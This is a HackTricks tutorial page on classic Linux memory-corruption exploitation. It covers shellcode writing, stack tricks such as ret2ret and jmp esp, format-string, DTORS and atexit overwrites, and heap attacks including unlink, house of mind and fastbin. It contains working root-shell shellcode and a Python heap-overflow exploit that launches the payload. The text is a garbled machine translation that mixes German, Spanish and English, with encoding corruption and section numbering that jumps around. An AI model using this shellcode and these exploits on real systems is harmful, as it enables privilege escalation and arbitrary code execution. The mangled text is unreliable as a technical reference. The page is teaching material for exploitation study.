# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## **2.SHELLCODE**

Siehe Kernel-Unterbrechungen: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; l√∂schen von eax\
xor ebx, ebx ; ebx = 0 da kein Argument √ºbergeben wird\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Syscall ausf√ºhren

**nasm -f elf assembly.asm** ‚Äî> Gibt uns eine .o-Datei zur√ºck\
**ld assembly.o -o shellcodeout** ‚Äî> Erzeugt eine ausf√ºhrbare Datei aus dem Assemblercode, aus der wir die Opcodes mit **objdump** extrahieren k√∂nnen\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Um sicherzustellen, dass es sich tats√§chlich um unseren Shellcode handelt und um die Opcodes zu extrahieren

**√úberpr√ºfen Sie, ob der Shellcode funktioniert**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar, ob die Systemaufrufe korrekt ausgef√ºhrt werden, muss das vorherige Programm kompiliert werden und die Systemaufrufe sollten in **strace ./KOMPILIERTE\_PROGRAMM** erscheinen.

Beim Erstellen von Shellcodes kann ein Trick angewendet werden. Die erste Anweisung ist ein Sprung zu einem Aufruf. Der Aufruf ruft den Originalcode auf und legt zus√§tzlich den EIP im Stack ab. Nach der Aufrufanweisung haben wir den ben√∂tigten String platziert, sodass wir mit diesem EIP auf den String zeigen und den Code weiter ausf√ºhren k√∂nnen.

BEISPIEL **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ using the Stack(/bin/sh):**  
**EJ mit dem Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Besteht aus einem kleinen Code, der die Speicherseiten eines Prozesses nach der darin gespeicherten Shellcode durchsucht (sucht nach einer Signatur im Shellcode). N√ºtzlich in F√§llen, in denen nur wenig Platz zum Einspritzen von Code zur Verf√ºgung steht.

**Polymorphe Shellcodes**

Es handelt sich um verschl√ºsselte Shells, die √ºber kleine Codes verf√ºgen, die sie entschl√ºsseln und zu ihnen springen lassen, unter Verwendung des Call-Pop-Tricks, hier ein **Beispiel f√ºr eine Caesar-Verschl√ºsselung**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Zus√§tzliche Methoden**

**Ret2Ret**

N√ºtzlich, wenn die Adresse des Stacks nicht in den EIP eingegeben werden kann (√ºberpr√ºfen, dass der EIP nicht 0xbf enth√§lt) oder wenn der Speicherort des Shellcodes nicht berechnet werden kann. Wenn jedoch die anf√§llige Funktion einen Parameter akzeptiert (der Shellcode wird hier platziert).

Durch das √Ñndern des EIP in eine Adresse zu einem **ret** wird die n√§chste Adresse geladen (die Adresse des ersten Arguments der Funktion). Das bedeutet, dass der Shellcode geladen wird.

Der Exploit w√ºrde sein: SHELLCODE + Padding (bis zum EIP) + **\&ret** (die n√§chsten Bytes des Stacks zeigen auf den Beginn des Shellcodes, da die Adresse des √ºbergebenen Parameters in den Stack eingef√ºgt wird)

Es scheint, dass Funktionen wie **strncpy** nach Abschluss die Adresse, an der der Shellcode gespeichert war, vom Stack entfernen und diese Technik unm√∂glich machen. Mit anderen Worten, die Adresse, die der Funktion als Argument √ºbergeben wird (die den Shellcode speichert), wird durch eine 0x00 ersetzt, sodass beim Aufruf des zweiten **ret** eine 0x00 gefunden wird und das Programm abst√ºrzt.



**Murat-Technik**

In Linux werden alle Programme bei 0xbfffffff gemappt.

Durch Betrachten des Aufbaus des Stacks eines neuen Prozesses in Linux kann ein Exploit entwickelt werden, sodass das Programm in einer Umgebung gestartet wird, in der nur eine Variable vorhanden ist, n√§mlich der Shellcode. Die Adresse davon kann dann berechnet werden als: addr = 0xbfffffff - 4 - strlen(KOMPLETTER\_AUSF√úHRBARER\_NAME) - strlen(shellcode)

Auf diese Weise k√∂nnte die Adresse, an der sich die Umgebungsvariable mit dem Shellcode befindet, einfach erhalten werden.

Dies ist m√∂glich, da die Funktion execle es erm√∂glicht, eine Umgebung zu erstellen, die nur die gew√ºnschten Umgebungsvariablen enth√§lt.

**Jump to ESP: Windows-Stil**

Da ESP immer auf den Anfang des Stacks zeigt, besteht diese Technik darin, den EIP durch die Adresse eines **jmp esp** oder **call esp** zu ersetzen. Auf diese Weise wird der Shellcode nach der √úberschreibung des EIP gespeichert, da nach dem Ausf√ºhren des **ret** ESP auf die n√§chste Adresse zeigt, genau dort, wo der Shellcode gespeichert wurde.

Wenn ASLR in Windows oder Linux nicht aktiviert ist, k√∂nnen **jmp esp** oder **call esp** aus einem gemeinsam genutzten Objekt aufgerufen werden. Wenn ASLR aktiviert ist, k√∂nnte innerhalb des anf√§lligen Programms gesucht werden.

Dar√ºber hinaus erm√∂glicht die Platzierung des Shellcodes nach der EIP-Korruption anstelle in der Mitte des Stacks, dass die push- oder pop-Anweisungen, die in der Funktion ausgef√ºhrt werden, die Shellcode nicht ber√ºhren (was passieren k√∂nnte, wenn sie in der Mitte des Stacks der Funktion platziert w√ºrden).

Sehr √§hnlich dazu, wenn bekannt ist, dass eine Funktion die Adresse speichert, an der der Shellcode gespeichert ist, kann **call eax** oder **jmp eax (ret2eax)** aufgerufen werden.

**Integer-√úberl√§ufe**

Diese Art von √úberl√§ufen tritt auf, wenn eine Variable nicht darauf vorbereitet ist, eine so gro√üe Zahl wie die √ºbergebene zu verarbeiten, m√∂glicherweise aufgrund einer Verwechslung zwischen vorzeichenbehafteten und vorzeichenlosen Variablen, zum Beispiel:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
En el vorherigen Beispiel sehen wir, dass das Programm 2 Parameter erwartet. Der erste ist die L√§nge des folgenden Strings und der zweite ist der String.

Wenn wir als ersten Parameter eine negative Zahl √ºbergeben, wird angezeigt, dass len < 256 ist und wir diesen Filter passieren, au√üerdem wird auch strlen(buffer) kleiner als l sein, da l ein unsigned int ist und sehr gro√ü sein wird.

Diese Art von Overflows zielt nicht darauf ab, etwas im Prozess des Programms zu schreiben, sondern darauf, schlecht gestaltete Filter zu umgehen, um andere Schwachstellen auszunutzen.

**Nicht initialisierte Variablen**

Es ist nicht bekannt, welchen Wert eine nicht initialisierte Variable annehmen kann, und es k√∂nnte interessant sein, dies zu beobachten. Es k√∂nnte sein, dass sie den Wert annimmt, den eine Variable aus der vorherigen Funktion hatte und diese vom Angreifer kontrolliert wird.

##

###

###

###

### **.fini\_array**

Im Wesentlichen handelt es sich hierbei um eine Struktur mit **Funktionen, die aufgerufen werden**, bevor das Programm beendet wird. Dies ist interessant, wenn Sie Ihren **Shellcode aufrufen k√∂nnen, indem Sie einfach zu einer Adresse springen**, oder in F√§llen, in denen Sie zur√ºck zu main gehen m√ºssen, um die **Format-String ein zweites Mal auszunutzen**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Hinweis, dass dies **keine** **endlose Schleife** erzeugt, da der Canary bemerken wird, dass das Ende des Stacks m√∂glicherweise besch√§digt ist und die Funktion nicht erneut aufgerufen wird. Daher k√∂nnen Sie mit diesem **eine weitere Ausf√ºhrung** der Schwachstelle haben.

### **Format Strings zum Auslesen von Inhalten**

Ein Format-String kann auch missbraucht werden, um Inhalte aus dem Speicher des Programms auszulesen.\
Zum Beispiel gibt es in der folgenden Situation eine **lokale Variable im Stack, die auf eine Flagge zeigt**. Wenn Sie herausfinden, wo im **Speicher** der **Zeiger** auf die **Flagge** ist, k√∂nnen Sie **printf** dazu bringen, auf diese **Adresse zuzugreifen** und die **Flagge** auszugeben:

Also, die Flagge ist in **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Und aus dem Leak k√∂nnen Sie sehen, dass der **Zeiger auf die Flagge** im **8. Parameter** liegt:

![](<../../.gitbook/assets/image (623).png>)

Daher k√∂nnen Sie durch **Zugriff auf den 8. Parameter** die Flagge erhalten:

![](<../../.gitbook/assets/image (624).png>)

Beachten Sie, dass Sie nach dem **vorherigen Exploit** und der Feststellung, dass Sie **Inhalte auslesen** k√∂nnen, **Zeiger** auf **`printf`** in den Abschnitt setzen k√∂nnen, in dem das **ausf√ºhrbare** Programm **geladen** ist, und es **vollst√§ndig auslesen**!

### **DTOR**

{% hint style="danger" %}
Heutzutage ist es sehr **selten, ein Bin√§rprogramm mit einem dtor-Abschnitt zu finden**.
{% endhint %}

Die Destruktoren sind Funktionen, die **ausgef√ºhrt werden, bevor das Programm beendet wird**.\
Wenn es Ihnen gelingt, eine **Adresse** zu einem **Shellcode** in **`__DTOR_END__`** zu **schreiben**, wird dies **ausgef√ºhrt**, bevor das Programm endet.\
Holen Sie sich die Adresse dieses Abschnitts mit:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
In der Regel finden Sie den **DTOR**-Abschnitt **zwischen** den Werten `ffffffff` und `00000000`. Wenn Sie also nur diese Werte sehen, bedeutet das, dass **keine Funktion registriert ist**. √úberschreiben Sie also die **`00000000`** mit der **Adresse** des **Shellcodes**, um ihn auszuf√ºhren.

### **Format Strings f√ºr Buffer Overflows**

Die **sprintf**-Funktion kopiert einen formatierten String **in** eine **Variable**. Daher k√∂nnten Sie die **Formatierung** eines Strings missbrauchen, um einen **Buffer Overflow in der Variable** zu verursachen.\
Beispielsweise schreibt das Payload `%.44xAAAA` 44B+"AAAA" in die Variable, was einen Buffer Overflow verursachen kann.

### **\_\_atexit-Strukturen**

{% hint style="danger" %}
Heutzutage ist es sehr **seltsam, dies auszunutzen**.
{% endhint %}

**`atexit()`** ist eine Funktion, der **andere Funktionen als Parameter √ºbergeben werden**. Diese **Funktionen** werden ausgef√ºhrt, wenn ein **`exit()`** ausgef√ºhrt wird oder das **Hauptprogramm beendet wird**.\
Wenn Sie die **Adresse** einer dieser **Funktionen** beispielsweise auf einen Shellcode zeigen lassen k√∂nnen, werden Sie die **Kontrolle √ºber den Prozess erlangen**, aber dies ist derzeit komplizierter.\
Derzeit sind die **Adressen der auszuf√ºhrenden Funktionen** hinter mehreren Strukturen versteckt, und schlie√ülich zeigen die Adressen, auf die sie zeigen, nicht auf die Adressen der Funktionen, sondern sind **verschl√ºsselt mit XOR** und Verschiebungen mit einem **zuf√§lligen Schl√ºssel**. Daher ist dieser Angriffsvektor derzeit **zumindest auf x86** und **x64\_86** nicht sehr n√ºtzlich.\
Die **Verschl√ºsselungsfunktion** ist **`PTR_MANGLE`**. **Andere Architekturen** wie m68k, mips32, mips64, aarch64, arm, hppa... **implementieren die Verschl√ºsselungsfunktion nicht**, da sie das Gleiche zur√ºckgeben wie sie als Eingabe erhalten haben. Daher w√§ren diese Architekturen durch diesen Vektor angreifbar.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Heutzutage ist es sehr **seltsam, dies auszunutzen**.
{% endhint %}

**`Setjmp()`** erm√∂glicht es, den **Kontext** (die Register) zu **speichern**.\
**`longjmp()`** erm√∂glicht es, den **Kontext** zu **wiederherstellen**.\
Die **gespeicherten Register** sind: `EBX, ESI, EDI, ESP, EIP, EBP`\
Das Problem ist, dass EIP und ESP durch die **`PTR_MANGLE`**-Funktion √ºbergeben werden, daher sind die **Architekturen, die anf√§llig f√ºr diesen Angriff sind, die gleichen wie oben**.\
Sie sind n√ºtzlich f√ºr Fehlerbehebung oder Unterbrechungen.\
Jedoch sind nach meinen Recherchen die anderen Register nicht gesch√ºtzt, **so dass, wenn es ein `call ebx`, `call esi` oder `call edi`** innerhalb der aufgerufenen Funktion gibt, die Kontrolle √ºbernommen werden kann. Oder Sie k√∂nnten auch EBP √§ndern, um ESP zu √§ndern.

**VTable und VPTR in C++**

Jede Klasse hat eine **Vtable**, die ein Array von **Methodenpointern** ist.

Jedes Objekt einer **Klasse** hat einen **VPtr**, der ein **Pointer** auf das Array seiner Klasse ist. Der VPtr ist Teil des Headers jedes Objekts, daher k√∂nnte, wenn eine **√úberschreibung** des **VPtr** erreicht wird, dieser so **ge√§ndert** werden, dass er auf eine Dummy-Methode zeigt, sodass beim Ausf√ºhren einer Funktion der Shellcode aufgerufen wird.

## **Pr√§ventivma√ünahmen und Umgehungen**

###

**Ersetzen von Libsafe**

Aktivieren mit: LD\_PRELOAD=/lib/libsafe.so.2\
oder\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Einige unsichere Funktionen werden durch sichere Funktionen ersetzt. Nicht standardisiert. (nur f√ºr x86, nicht f√ºr Kompilierungen mit -fomit-frame-pointer, nicht f√ºr statische Kompilierungen, nicht alle anf√§lligen Funktionen werden sicher gemacht und LD\_PRELOAD funktioniert nicht bei SUID-Bin√§rdateien).

**ASCII-gesch√ºtzter Adressraum**

L√§dt gemeinsam genutzte Bibliotheken von 0x00000000 bis 0x00ffffff, damit immer ein Byte 0x00 vorhanden ist. Dies h√§lt jedoch kaum einen Angriff auf, insbesondere nicht in Little Endian.

**ret2plt**

F√ºhrt ein ROP aus, bei dem die Funktion strcpy@plt (aus der plt) aufgerufen wird und auf den Eintrag in der GOT gezeigt wird und das erste Byte der zu aufrufenden Funktion (system()) kopiert wird. Anschlie√üend wird dasselbe mit GOT+1 gemacht und das 2. Byte von system() kopiert... Schlie√ülich wird die in der GOT gespeicherte Adresse aufgerufen, die system() sein wird.

**Chroot-K√§fige**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installiert ein grundlegendes System unter einem bestimmten Unterverzeichnis

Ein Administrator kann aus einem dieser K√§fige ausbrechen, indem er: mkdir foo; chroot foo; cd ..

**Codeinstrumentierung**

Valgrind ‚Äî> Sucht nach Fehlern\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Grundlegende Exploits**

**Zugewiesenes St√ºck**

prev\_size |\
size | ‚ÄîHeader\
\*mem | Daten

**Freies St√ºck**

prev\_size |\
size |\
\*fd | Ptr vorw√§rts Chunk\
\*bk | Ptr r√ºckw√§rts Chunk ‚ÄîHeader\
\*mem | Daten

Die freien St√ºcke sind in einer doppelt verketteten Liste (bin) und es d√ºrfen niemals zwei freie St√ºcke nebeneinander sein (sie werden zusammengef√ºhrt).

Im "size"-Feld gibt es Bits, um anzuzeigen: ob das vorherige St√ºck verwendet wird, ob das St√ºck √ºber mmap() zugewiesen wurde und ob das St√ºck zum prim√§ren Arena geh√∂rt.

Wenn ein St√ºck freigegeben wird und eines der benachbarten St√ºcke frei ist, werden sie durch die Makro unlink() fusioniert und das gr√∂√üere neue St√ºck wird an frontlink() √ºbergeben, um es in den entsprechenden Bin einzuf√ºgen.

unlink(){\
BK = P->bk; ‚Äî> Das BK des neuen Chunks ist das, was das zuvor freie St√ºck hatte\
FD = P->fd; ‚Äî> Das FD des neuen Chunks ist das, was das zuvor freie St√ºck hatte\
FD->bk = BK; ‚Äî> Das BK des n√§chsten Chunks zeigt auf den neuen Chunk\
BK->fd = FD; ‚Äî> Das FD des vorherigen Chunks zeigt auf den neuen Chunk\
}

Daher, wenn es gelingt, P->bk mit der Adresse eines Shellcodes und P->fd mit der Adresse eines Eintrags in der GOT oder DTORS minus 12 zu √§ndern, wird erreicht:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Dadurch wird der Shellcode beim Verlassen des Programms ausgef√ºhrt.

Au√üerdem schreibt die 4. Anweisung von unlink() etwas und der Shellcode muss daf√ºr angepasst werden:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Dies f√ºhrt dazu, dass 4 Bytes ab dem 8. Byte des Shellcodes geschrieben werden, daher sollte das erste Instruction des Shellcodes ein Sprungbefehl sein, um dies zu √ºberspringen und zu den Nops zu gelangen, die zum Rest des Shellcodes f√ºhren.

Daher wird der Exploit erstellt:

Im Puffer1 wird der Shellcode platziert, beginnend mit einem Sprungbefehl, damit er zu den Nops oder zum Rest des Shellcodes gelangt.

Nach dem Shellcode wird F√ºllmaterial eingef√ºgt, bis die Felder prev\_size und size des n√§chsten St√ºcks erreicht sind. An diesen Stellen werden 0xfffffff0 (um prev\_size zu √ºberschreiben, damit das Bit angezeigt wird, dass es frei ist) und "-4" (0xfffffffc) in die size eingef√ºgt (damit, wenn im 3. St√ºck √ºberpr√ºft wird, ob das 2. St√ºck frei ist, tats√§chlich auf die modifizierte prev\_size zugegriffen wird, die angibt, dass es frei ist) -> Wenn also free() √ºberpr√ºft, wird es zur size des 3. St√ºcks gehen, aber tats√§chlich zum 2. - 4. und denken, dass das 2. St√ºck frei ist. Dann wird **unlink()** aufgerufen.

Beim Aufruf von unlink() werden die ersten Daten des 2. St√ºcks als P->fd verwendet, sodass die Adresse, die √ºberschrieben werden soll, - 12 (weil FD->bk 12 zur in FD gespeicherten Adresse hinzuf√ºgt) dort eingef√ºgt wird. An dieser Stelle wird die zweite Adresse im 2. St√ºck eingef√ºgt, die die Adresse des Shellcodes sein soll (falsches P->bk).

**from struct import \***

**import os**
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Wir kontrollieren 3 aufeinanderfolgende Chunks und geben sie in umgekehrter Reihenfolge frei.

In diesem Fall:

Im Chunk c wird der Shellcode platziert.

Der Chunk a wird verwendet, um das b zu √ºberschreiben, so dass das Bit PREV\_INUSE deaktiviert wird, damit der Chunk a als frei betrachtet wird.

Dar√ºber hinaus wird die Gr√∂√üe im Header b √ºberschrieben, damit sie -4 betr√§gt.

Dann wird das Programm denken, dass "a" frei ist und in einem Bin liegt, und unlink() aufrufen, um es zu entkoppeln. Da jedoch die Kopfgr√∂√üe PREV\_SIZE -4 betr√§gt, wird angenommen, dass der "a"-Chunk tats√§chlich bei b+4 beginnt. Das hei√üt, es wird ein unlink() auf einen Chunk durchgef√ºhrt, der bei b+4 beginnt. Daher wird bei b+12 der "fd"-Zeiger und bei b+16 der "bk"-Zeiger sein.

Auf diese Weise, wenn wir die Adresse des Shellcodes in bk und die Adresse der Funktion "puts()"-12 in fd setzen, haben wir unser Payload.

**Frontlink-Technik**

Frontlink wird aufgerufen, wenn etwas freigegeben wird und keiner seiner benachbarten Chunks frei ist. Es wird unlink() nicht aufgerufen, sondern direkt frontlink().

Eine n√ºtzliche Schwachstelle, wenn der angegriffene malloc nie freigegeben (free()) wird.

Ben√∂tigt werden:

Ein Puffer, der mit der Eingabefunktion √ºberlaufen kann

Ein benachbarter Puffer, der freigegeben werden muss und dessen Kopf-FD-Feld durch den √úberlauf des vorherigen Puffers ge√§ndert wird

Ein Puffer, der gr√∂√üer als 512, aber kleiner als der vorherige Puffer freigegeben wird

Ein vor dem Schritt 3 deklarierter Puffer, der das prev\_size dieses Puffers √ºberschreiben kann

Durch das √úberschreiben von zwei mallocs auf unkontrollierte Weise und eines auf kontrollierte Weise, der nur einmal freigegeben wird, k√∂nnen wir einen Exploit durchf√ºhren.

**Vulnerabilit√§t double free()**

Wenn free() zweimal mit demselben Zeiger aufgerufen wird, zeigen zwei Bins auf dieselbe Adresse.

Wenn einer erneut verwendet werden soll, wird er ohne Probleme zugewiesen. Wenn der andere verwendet werden soll, wird ihm derselbe Speicherplatz zugewiesen, sodass die "fd"- und "bk"-Zeiger mit den Daten gef√§lscht werden, die die vorherige Reservierung schreiben wird.

**After free()**

Ein zuvor freigegebener Zeiger wird erneut ohne Kontrolle verwendet.

## **8 Heap Overflows: Fortgeschrittene Exploits**

Die Techniken Unlink() und FrontLink() wurden entfernt, als die Funktion unlink() ge√§ndert wurde.

**The house of mind**

Es ist nur ein Aufruf von free() erforderlich, um die Ausf√ºhrung beliebigen Codes zu verursachen. Es ist wichtig, einen zweiten Chunk zu finden, der von einem vorherigen √ºberlaufen und freigegeben werden kann.

Ein Aufruf von free() f√ºhrt dazu, dass public\_fREe(mem) aufgerufen wird, das Folgendes ausf√ºhrt:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Gibt einen Zeiger auf die Adresse zur√ºck, an der der Chunk beginnt (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] wird das Feld size und das Bit NON\_MAIN\_ARENA √ºberpr√ºft, das ge√§ndert werden kann, damit die √úberpr√ºfung true zur√ºckgibt und heap\_for\_ptr() ausgef√ºhrt wird, das ein "and" auf "mem" ausf√ºhrt und die 2,5 unwichtigsten Bytes auf 0 setzt (in unserem Fall von 0x0804a000 auf 0x08000000) und auf 0x08000000->ar\_ptr zugreift (als ob es ein struct heap\_info w√§re).

Auf diese Weise k√∂nnen wir beispielsweise einen Chunk bei 0x0804a000 kontrollieren und einen Chunk bei **0x081002a0** freigeben, um zur Adresse 0x08100000 zu gelangen und beispielsweise **0x0804a000** zu schreiben. Wenn dieser zweite Chunk freigegeben wird, wird heap\_for\_ptr(ptr)->ar\_ptr den Wert zur√ºckgeben, den wir in 0x08100000 geschrieben haben (da der "and"-Operator auf 0x081002a0 angewendet wird und von dort der Wert der ersten 4 Bytes, ar\_ptr, abgeleitet wird).

Daher wird \_int\_free(ar\_ptr, mem) aufgerufen, d.h. **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Wie wir zuvor gesehen haben, k√∂nnen wir den Wert von av kontrollieren, da wir ihn in dem Chunk geschrieben haben, der freigegeben wird.

Wie unsorted\_chunks definiert ist, wissen wir, dass:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Daher, wenn wir in av->bins\[2] den Wert von \_\_DTOR\_END\_\_-12 schreiben, wird in der letzten Anweisung in \_\_DTOR\_END\_\_ die Adresse des zweiten Chunks geschrieben.

Das hei√üt, wir m√ºssen am Anfang des ersten Chunks viele Male die Adresse von \_\_DTOR\_END\_\_-12 setzen, weil av->bins\[2] sie von dort abrufen wird.

An der Adresse, an der die Adresse des zweiten Chunks mit den letzten 5 Nullen landet, m√ºssen wir die Adresse dieses ersten Chunks setzen, damit heap\_for\_ptr() denkt, dass ar\_ptr am Anfang des ersten Chunks liegt und av->bins\[2] von dort abruft.

Im zweiten Chunk und dank des ersten √ºberschreiben wir prev\_size mit einem Sprung von 0x0c und size mit etwas, um -> NON\_MAIN\_ARENA zu aktivieren.

Dann f√ºgen wir im zweiten Chunk viele Nops hinzu und schlie√ülich den Shellcode ein.

Auf diese Weise wird \_int\_free(CHUNK1, CHUNK2) aufgerufen und die Anweisungen zum Schreiben in \_\_DTOR\_END\_\_ der Adresse von prev\_size des CHUNK2, der dann zum Shellcode springt, ausgef√ºhrt.
Para apply this technique, some additional requirements need to be met, which complicate the payload further.

This technique is no longer applicable as almost the same patch as for unlink was applied. It compares if the new site being pointed to is also pointing back to it.

**Fastbin**

It is a variant of The house of mind.

We are interested in executing the following code, which is reached after the first check of the \_int\_free() function:

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Being fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

...

p->fd = \*fb

\*fb = p

This way, if "fb" is set to a function address in the GOT, the overwritten chunk will be placed at this address. For this to work, the arena needs to be close to the dtors addresses. More precisely, av->max\_fast needs to be at the address we are going to overwrite.

Since with The House of Mind we saw that we controlled the position of av.

So, if we set a size of 8 + NON\_MAIN\_ARENA + PREV\_INUSE in the size field, fastbin\_index() will return fastbins\[-1\], which will point to av->max\_fast.

In this case, av->max\_fast will be the address to be overwritten (not the one it points to, but that position will be overwritten).

Additionally, the chunk adjacent to the freed one must be larger than 8 -> Since we have stated that the size of the freed chunk is 8, in this fake chunk, we just need to put a size larger than 8 (also, since the shellcode will be in the freed chunk, we need to put a jmp at the beginning that falls into nops).

